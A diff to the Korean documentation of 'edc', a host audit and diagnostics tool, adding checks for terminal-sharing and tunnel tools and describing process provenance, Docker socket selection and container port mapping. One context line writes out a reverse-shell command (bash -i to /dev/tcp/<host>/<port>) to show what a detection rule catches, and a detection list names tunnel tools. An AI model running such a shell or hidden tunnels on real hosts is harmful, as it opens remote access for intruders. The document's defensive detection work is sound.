@@ -198,6 +198,7 @@ sudo edc audit --json -         # 점검마다 결과 하나
 | `proc.preload` | | `/etc/ld.so.preload`에 항목이 있거나 `LD_PRELOAD`로 실행 중인 process가 있음 |
 | `proc.socket_shell` | | process의 표준 입력이나 출력이 TCP 연결임(reverse shell) |
 | `proc.raw_socket` | | 실행 파일이 임시 디렉터리, 지워진 파일, 메모리에 있거나 어느 dpkg 패키지에도 없는 process가 packet·raw 소켓을 쥠 |
+| `proc.remote_share` | | 밖의 중계 서버로 터미널을 공유하는 도구(`tmate`, `sshx`, `upterm`, `tty-share`)가 실행 중이거나, systemd system 서비스 밖에서 터널 도구(`ngrok`, `cloudflared`, `frpc`, `chisel`, `bore`)가 실행 중임 |
 | `persist.changed` | | cron, systemd, 시작 스크립트, `sudoers.d`, `pam.d`, `ld.so.conf.d`, udev, motd 파일이나 계정의 shell 시작 파일, `~/.ssh/rc`가 최근 7일 안에 바뀜 |
 | `file.sensitive` | 다른 사용자가 `/etc/shadow`를 읽거나 `/etc/passwd`, `/etc/sudoers`, `docker.sock`에 쓸 수 있음 | |
 | `file.path_writable` | 다른 사용자가 root `PATH`의 디렉터리에 쓸 수 있거나 `PATH`에 상대 경로가 있음 | |
@@ -236,11 +237,11 @@ SSH 키 점검은 `AuthorizedKeysFile`의 파일을 읽습니다. 기본값은 `
 
 백도어 점검은 `/proc`를 한 번 훑습니다. `net.reverse_tunnel`은 포트를 듣는 sshd 연결 process를 찾습니다. `ssh -R` client가 연 포트이며, 이 포트로 들어온 연결은 그 ssh 연결을 타고 나갑니다. `ssh -X`가 X11에 쓰는 loopback 6010~6099 포트는 판정하지 않습니다. 이 호스트의 `ssh` client 인자도 읽습니다. `-R`, `-w`, `RemoteForward`, `Tunnel`은 원격 호스트에서 이 호스트로 들어오는 길을 엽니다. `-L`과 `-D`는 흔해서 판정하지 않습니다. `~/.ssh/config`의 `RemoteForward`는 인자에 없어 보이지 않습니다.
 
-`ssh.extra_sshd`는 sshd listener마다 cgroup을 읽습니다. ssh 서비스 밖의 sshd는 자기 설정과 로그 파일을 쓸 수 있어, 그 로그인이 journal에 남지 않을 수 있습니다. 컨테이너 안의 sshd는 판정하지 않습니다. `proc.socket_shell`은 process의 표준 입력이나 출력이 TCP 연결이면 warn입니다. `bash -i >& /dev/tcp/<host>/<port>`가 이 모양을 만듭니다. 표준 오류만 소켓으로 쓰는 daemon은 판정하지 않습니다. `proc.raw_socket`은 `/proc/net/packet`, `/proc/net/raw`, `/proc/net/raw6`를 읽습니다. 수동형 백도어는 listen 포트 없이 이런 소켓에서 특정 packet을 기다립니다. `systemd-networkd`처럼 dpkg 패키지에 속한 process는 판정하지 않습니다.
+`ssh.extra_sshd`는 sshd listener마다 cgroup을 읽습니다. ssh 서비스 밖의 sshd는 자기 설정과 로그 파일을 쓸 수 있어, 그 로그인이 journal에 남지 않을 수 있습니다. 컨테이너 안의 sshd는 판정하지 않습니다. `proc.socket_shell`은 process의 표준 입력이나 출력이 TCP 연결이면 warn입니다. `bash -i >& /dev/tcp/<host>/<port>`가 이 모양을 만듭니다. 표준 오류만 소켓으로 쓰는 daemon은 판정하지 않습니다. `proc.raw_socket`은 `/proc/net/packet`, `/proc/net/raw`, `/proc/net/raw6`를 읽습니다. 수동형 백도어는 listen 포트 없이 이런 소켓에서 특정 packet을 기다립니다. `systemd-networkd`처럼 dpkg 패키지에 속한 process는 판정하지 않습니다. `proc.remote_share`는 실행 파일 이름으로 이 도구들을 찾습니다. 연결이 없는 도구도 다시 연결할 수 있으므로 연결 상태로는 판정하지 않습니다. 근거에는 `/run/systemd/sessions`에서 읽은 로그인 세션이 나오고, 그 세션이 끝났으면 그 사실도 함께 나옵니다. `audit.accept`는 점검 단위로 적용되므로 systemd system 서비스로 둔 터널 도구는 판정하지 않습니다.
 
 `kernel.taint`는 `/proc/sys/kernel/tainted`와 `/sys/module/*/taint`를 읽습니다. 근거에는 taint가 있는 모듈과 `/lib/modules` 아래의 파일이 나옵니다. 그 아래에 파일이 없는 모듈은 다른 경로에서 넣은 것입니다. GPU 드라이버 같은 DKMS 모듈도 taint를 남기므로 warn만 냅니다. 상용(P)과 livepatch(K) 표시는 판정하지 않습니다. 커널은 재부팅 전까지 taint를 남깁니다. `file.pkg_modified`는 `openssh-server`, `sudo`, `procps`, `coreutils`, `libpam-modules` 등 패키지 18개의 binary와 PAM 모듈의 MD5를 `/var/lib/dpkg/info/*.md5sums`와 비교합니다. `dpkg-divert`로 옮긴 경로는 건너뜁니다. dpkg가 없는 호스트는 `skip`입니다.
 
-`persist.changed`는 로그인, 부팅, 정해진 시각에 명령을 실행하는 파일을 읽습니다. 파일마다 mtime과 ctime 가운데 늦은 쪽을 봅니다. `systemctl enable`이 만든 symlink도 파일로 셉니다. 바뀐 때로부터 1시간 안에 dpkg가 그 파일의 패키지 목록을 고쳤다면 패키지 업그레이드가 바꾼 것이라 판정하지 않고, 그 수를 경고로 알립니다. 근거에는 바뀌기 바로 전의 `wtmp` 로그인이 나옵니다. `docker.escape`는 docker socket으로 실행 중인 컨테이너를 읽습니다. 호스트 `/`를 읽기 전용으로 mount하거나 host network를 쓰는 것은 모니터링 컨테이너에서 흔해 판정하지 않습니다. docker 없이 containerd나 Kubernetes로 띄운 컨테이너는 읽지 않습니다.
+`persist.changed`는 로그인, 부팅, 정해진 시각에 명령을 실행하는 파일을 읽습니다. 파일마다 mtime과 ctime 가운데 늦은 쪽을 봅니다. `systemctl enable`이 만든 symlink도 파일로 셉니다. 바뀐 때로부터 1시간 안에 dpkg가 그 파일의 패키지 목록을 고쳤다면 패키지 업그레이드가 바꾼 것이라 판정하지 않고, 그 수를 경고로 알립니다. 근거에는 바뀌기 바로 전의 `wtmp` 로그인이 나옵니다. `docker.escape`는 docker socket으로 실행 중인 컨테이너를 읽습니다. socket은 `edc ctr`과 같은 순서로 고르므로 `DOCKER_HOST`와 rootless Docker 같은 docker context가 적용됩니다. socket을 고르지 못하면 `docker.escape`는 그 이유와 함께 `skip`입니다. 호스트 `/`를 읽기 전용으로 mount하거나 host network를 쓰는 것은 모니터링 컨테이너에서 흔해 판정하지 않습니다. docker 없이 containerd나 Kubernetes로 띄운 컨테이너는 읽지 않습니다.
 
 `proc.unusual_exe`는 `/proc/<pid>/exe`를 읽습니다. 패키지를 업그레이드하면 실행 중인 daemon의 binary가 지워진 채 남으므로 `/usr`, `/bin`, `/sbin`, `/lib`, `/lib64` 아래에서 지워진 binary는 판정하지 않습니다. `runc`가 자기를 메모리에 복제해 실행하는 것도 판정하지 않습니다. 근거에는 시작 시각, 부모 process, 지워진 파일의 지금 상태가 나옵니다. 같은 경로에 새 파일이 있으면 그 process는 재시작하기 전까지 옛 binary로 돌고 있는 것이고, 경로에 파일이 없으면 파일을 지운 것입니다. 같은 규칙으로 `/proc/<pid>/maps`에서 지워진 공유 라이브러리를 찾습니다. `proc.preload`는 `/etc/ld.so.preload`와 `/proc/<pid>/environ`의 `LD_PRELOAD`를 읽습니다. 다른 사용자 process의 환경은 root만 읽을 수 있습니다. 호스트에 dpkg 기록이 있으면 근거에 미리 넣은 라이브러리마다 소속 패키지가 나옵니다. 어느 패키지에도 속하지 않은 라이브러리는 누가 직접 넣은 것입니다. 경로의 `/lib`와 `/usr/lib` 형태와 symlink의 대상까지 확인합니다.
 
@@ -346,13 +347,15 @@ edc proc -v 1234         # 명령행 전체
 
 | 결과 | 보여 주는 것 | 경고 조건 |
 |---|---|---|
-| `proc.process` | PID, 이름, 사용자, 실행 시간, 명령행, 부모, 작업 디렉터리, thread 수 | zombie이거나(`next`는 부모를 가리킵니다) D 상태로 I/O를 기다릴 때 |
+| `proc.process` | PID, 이름, 사용자, 실행 시간과 시작 시각, 명령행, 부모, 작업 디렉터리, thread 수. Linux에서는 실행 파일, 그 파일의 dpkg 패키지, 로그인 세션도 | zombie이거나(`next`는 부모를 가리킵니다) D 상태로 I/O를 기다릴 때 |
 | `proc.resources` | 0.5초 동안의 CPU, 메모리와 RSS | |
 | `proc.fd` | 종류별 열린 fd 수, Linux에서는 soft limit 대비 사용률, 지워졌지만 아직 열린 파일 | fd 한도의 80% 이상을 쓸 때 |
 | `proc.sockets` | 대기 포트, 상태별 연결 수, 연결이 많은 상대 | `CLOSE_WAIT` 연결이 10개 이상일 때 |
 | `proc.cgroup` | cgroup v2 경로, `memory.max` 대비 메모리 사용량, OOM kill, CPU 제한 횟수. Linux에서만 읽습니다. | 메모리가 `memory.max`의 80% 이상이거나 OOM kill이 있었을 때 |
 
-명령행의 비밀 옵션과 URL 인증 정보는 `edc listen`과 같은 규칙으로 가립니다. `-v`가 없으면 명령행을 200자 한 줄로 자릅니다. process의 대기 포트로 들어온 연결은 상대 주소로, 나간 연결은 상대 주소와 포트로 묶습니다. Linux에서는 `/proc/<pid>`와 그 process의 network namespace에서 본 TCP 표를 읽으므로 container process는 자기 연결이 보입니다. macOS에서는 `lsof`로 fd와 소켓을 읽습니다. root가 아니면 다른 계정의 fd와 소켓은 `skip`입니다. 지워진 파일은 process가 닫을 때까지 디스크 공간을 차지합니다. memfd와 `/dev/shm` 파일은 세지 않습니다.
+명령행의 비밀 옵션과 URL 인증 정보는 `edc listen`과 같은 규칙으로 가립니다. `-v`가 없으면 명령행을 200자 한 줄로 자릅니다. process의 대기 포트로 들어온 연결은 상대 주소로, 나간 연결은 상대 주소와 포트로 묶습니다. Linux에서는 `/proc/<pid>`와 그 process의 network namespace에서 본 TCP 표를 읽으므로 container process는 자기 연결이 보입니다. macOS에서는 `lsof`로 fd와 소켓을 읽습니다. root가 아니면 다른 계정의 fd와 소켓은 `skip`입니다. 지워진 파일은 process가 닫을 때까지 디스크 공간을 차지합니다. memfd와 `/dev/shm` 파일은 세지 않습니다. edc는 끝에 그 process가 아직 PID를 쥐고 있는지 확인합니다. Linux에서는 읽는 동안 `/proc/<pid>`를 열어 두고, macOS에서는 `kern.proc.pid`의 시작 시각을 마이크로초까지 대조합니다. 그 사이에 process가 끝났으면 세부 정보가 비었거나 다른 process의 것일 수 있으므로, 결과를 내지 않고 1로 끝납니다. 그 사이에 zombie가 된 process도 끝난 것으로 봅니다. PID를 주면 CPU 표본을 뜨기 전에 처음 확인하고, 이름을 주면 표본을 뜬 뒤에 확인하며 표본의 시작 시각과 대조합니다. 그래서 이름으로 고를 때는 Linux에서는 같은 clock tick 안에, macOS에서는 같은 초 안에 그 PID를 다시 쓴 process를 가르지 못합니다.
+
+Linux에서 `proc.process`는 process가 어디서 왔는지도 보여 줍니다. `exe`는 실행 파일입니다. `패키지`는 이 파일을 가진 dpkg 패키지와, dpkg가 그 패키지를 마지막으로 설치하거나 업그레이드한 시각입니다. 이 시각은 `/var/lib/dpkg/info`에 있는 그 패키지 파일 목록의 수정 시각입니다. 이 파일을 가진 패키지가 없으면 `없음`으로 표시하고, dpkg가 없는 host에서는 `패키지` 줄이 없습니다. `세션`은 process를 띄운 로그인 세션입니다. 사용자, 원격 host, 서비스, 시작 시각을 `/run/systemd/sessions`에서 읽습니다. 사용자가 로그아웃했는데 process가 아직 돌고 있으면 그 사실도 표시합니다. system 서비스처럼 로그인 세션 밖에서 뜬 process에는 `세션` 줄이 없습니다.
 
 ## 예약 작업 (Linux와 macOS)
 
@@ -382,7 +385,7 @@ edc ctr --json - web
 edc ctr --collector-image edc-collector:amd64 web
 ```
 
-다른 socket을 쓰려면 `DOCKER_HOST`에 절대 경로의 Unix socket URL을 지정합니다. `DOCKER_CONTEXT=default`는 `DOCKER_HOST`를 무시합니다. edc는 Docker context나 credential 파일을 읽지 않습니다. default가 아닌 context와 TCP·SSH·TLS endpoint는 오류를 냅니다. Linux는 `/var/run/docker.sock`을 씁니다. macOS는 `~/.docker/run/docker.sock`이 있으면 그 경로를 쓰고, 없으면 `/var/run/docker.sock`을 씁니다.
+다른 socket을 쓰려면 `DOCKER_HOST`에 절대 경로의 Unix socket URL을 지정합니다. edc는 docker CLI와 같은 순서로 socket을 고릅니다. `DOCKER_CONTEXT`, `DOCKER_HOST`, `docker context use`로 고른 현재 context, 기본 socket 순입니다. `DOCKER_CONTEXT=default`는 `DOCKER_HOST`를 무시합니다. context의 endpoint는 `~/.docker/contexts`나 `$DOCKER_CONFIG/contexts`에서 읽습니다. OrbStack은 자기 socket을 이 방법으로만 알립니다. TCP·SSH·TLS endpoint를 쓰는 context나 `DOCKER_HOST`는 오류를 냅니다. credential 파일은 읽지 않습니다. 기본 socket은 Linux에서는 `/var/run/docker.sock`이고, macOS에서는 `~/.docker/run/docker.sock`이 있으면 그 경로, 없으면 `/var/run/docker.sock`입니다.
 
 기본 상세 조회는 읽기 전용 GET 요청만 보냅니다. Docker API 1.41부터 1.51까지 협상합니다. 개별 요청은 5초로 제한하고, 기본 전체 제한은 15초입니다.
 
@@ -390,7 +393,7 @@ edc ctr --collector-image edc-collector:amd64 web
 |---|---|---|
 | `ctr.state` | 상태, 재시작, health, 종료 코드 | 기존 결과를 유지합니다. |
 | `ctr.image` | 현재 이미지 참조와 image ID | 기존 결과를 유지합니다. |
-| `ctr.processes` | Docker top API의 process, CPU, RSS | 기존 결과를 유지합니다. daemon이 요청한 열을 거부하면 오류를 표시합니다. |
+| `ctr.processes` | Docker top API의 process, CPU, RSS. OrbStack VM의 busybox `ps`가 `pcpu`를 거부하면 `pid,rss,time,etime,args`로 다시 묻고, CPU를 누적 CPU 시간과 실행 시간으로 초 단위까지 셈합니다. | 기존 결과를 유지합니다. daemon이 그 밖의 이유로 요청한 열을 거부하면 오류를 표시합니다. |
 | `ctr.limits` | API 필드가 있으면 memory, 한도, CPU throttle, pids | container cgroup 수명 동안의 OOM·oom_kill 누적 횟수 |
 | `ctr.fd` | 제공하지 않음 | 대상 cgroup process별 FD 수와 soft limit |
 | `ctr.listen` | publish한 port 설정 | 대상 process FD가 소유한 TCP·UDP listener의 주소와 port |
@@ -547,4 +550,6 @@ edc listen --full
 edc listen --watch -i 0.5 --duration 10s
 ```
 
-`--full`은 행마다 아래에 프로세스의 작업 디렉터리와 명령줄을 회색 줄로 붙입니다. 같은 `node`나 `python` 서버 여럿을 이 줄로 구분할 수 있습니다. `node`, `python`, `ruby`, `perl`, `php`는 스크립트 이름을 앞에 둡니다. 터미널에서는 화면 폭에 맞춰 줄을 자르므로 명령줄의 끝이 먼저 잘립니다. `--password`, `--token` 같은 옵션의 값과 URL의 암호는 `***`로 가립니다. `edc listen --json`은 읽을 수 있는 프로세스의 `args`와 `cwd`를 담습니다. root가 아니면 macOS에서는 다른 계정의 프로세스를, Linux에서는 다른 계정의 작업 디렉터리를 읽을 수 없습니다. `--full`은 `--watch`와 함께 쓸 수 없습니다.
+`--full`은 행마다 아래에 프로세스의 작업 디렉터리와 명령줄을 회색 줄로 붙입니다. 같은 `node`나 `python` 서버 여럿을 이 줄로 구분할 수 있습니다. `node`, `python`, `ruby`, `perl`, `php`는 스크립트 이름을 앞에 둡니다. 터미널에서는 화면 폭에 맞춰 줄을 자르므로 명령줄의 끝이 먼저 잘립니다. `--password`, `--token`, redis의 `--requirepass` 같은 옵션의 값과 URL의 암호는 `***`로 가립니다. `edc listen --json`은 읽을 수 있는 프로세스의 `args`와 `cwd`를 담습니다. root가 아니면 macOS에서는 다른 계정의 프로세스를, Linux에서는 다른 계정의 작업 디렉터리를 읽을 수 없습니다. `--full`은 `--watch`와 함께 쓸 수 없습니다.
+
+컨테이너가 publish한 포트이면 행에 `→` 뒤로 그 컨테이너도 표시합니다(`OrbStack Helper (9378) → pg (postgres:16)`). OrbStack과 `docker-proxy`는 컨테이너 대신 host에서 publish한 포트를 열기 때문에, 소켓의 process는 실제 서버가 아닙니다. edc는 Docker Engine에 publish한 포트를 묻고, 프로토콜, 포트, host 주소가 같은 소켓을 찾습니다. `--full`은 컨테이너 안의 포트와 컨테이너의 첫 process도 표시합니다. Engine socket은 `edc ctr`과 같은 방법으로 찾습니다. Engine에 닿지 못하면 행에는 process만 나오고, `--json`의 `container_error`에 이유가 남습니다. OrbStack이 자기 자신을 위해 연 포트처럼 어느 컨테이너도 publish하지 않은 포트에는 process만 나옵니다.
